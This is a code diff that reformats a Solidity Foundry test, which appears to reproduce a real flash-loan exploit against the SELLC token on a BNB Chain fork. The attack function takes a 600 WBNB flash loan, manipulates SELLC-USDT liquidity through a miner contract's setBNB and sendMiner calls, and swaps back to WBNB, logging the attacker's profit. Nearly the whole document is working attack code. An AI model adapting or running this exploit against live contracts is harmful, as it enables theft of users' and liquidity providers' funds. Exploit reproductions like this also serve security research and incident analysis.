@@ -19,7 +19,7 @@ import "./interface.sol";
 // Hacking God : https://www.google.com/
 
 interface Miner {
-    function setBNB(address token,address token1) payable external;
+    function setBNB(address token, address token1) external payable;
     function sendMiner(address token) external;
 }
 
@@ -34,27 +34,25 @@ contract ContractTest is Test {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 29005754);
+        cheats.createSelectFork("bsc", 29_005_754);
         cheats.label(address(WBNB), "WBNB");
         cheats.label(address(USDT), "USDT");
         cheats.label(address(SELLC), "SELLC");
         cheats.label(address(SELLC_USDT), "SELLC_USDT");
         cheats.label(address(Router), "Router");
-        WBNB.approve(address(Router), type(uint).max);
-        USDT.approve(address(Router), type(uint).max);
-        SELLC.approve(address(Router), type(uint).max);
-        SELLC_USDT.approve(address(Router), type(uint).max);
+        WBNB.approve(address(Router), type(uint256).max);
+        USDT.approve(address(Router), type(uint256).max);
+        SELLC.approve(address(Router), type(uint256).max);
+        SELLC_USDT.approve(address(Router), type(uint256).max);
     }
 
     function testExploit() public {
         miner.setBNB{value: 0.01 ether}(address(SELLC), address(USDT));
-        cheats.warp(block.timestamp + 1 * 86400 + 1);
+        cheats.warp(block.timestamp + 1 * 86_400 + 1);
         oracle.flashLoan(600 * 1e18, 0, address(this), new bytes(1));
         emit log_named_decimal_uint(
-            "[End] Attacker WBNB balance after exploit",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
-        );
+            "[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
+            );
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
@@ -62,20 +60,12 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(SELLC);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            200 * 1e18,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            200 * 1e18, 0, path, address(this), block.timestamp
         );
         path[0] = address(SELLC);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            SELLC.balanceOf(address(this)) * 1 / 100,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            SELLC.balanceOf(address(this)) * 1 / 100, 0, path, address(this), block.timestamp
         );
         Router.addLiquidity(
             address(SELLC),
@@ -90,30 +80,16 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(SELLC);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            400 * 1e18,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            400 * 1e18, 0, path, address(this), block.timestamp
         );
         miner.sendMiner(address(SELLC));
         Router.removeLiquidity(
-            address(SELLC),
-            address(USDT),
-            SELLC_USDT.balanceOf(address(this)),
-            0,
-            0,
-            address(this),
-            block.timestamp
+            address(SELLC), address(USDT), SELLC_USDT.balanceOf(address(this)), 0, 0, address(this), block.timestamp
         ); // remove SELLC-USDT Liquidity
         path[0] = address(SELLC);
         path[1] = address(WBNB);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            SELLC.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
         WBNB.transfer(address(oracle), 600 * 1e18);
     }
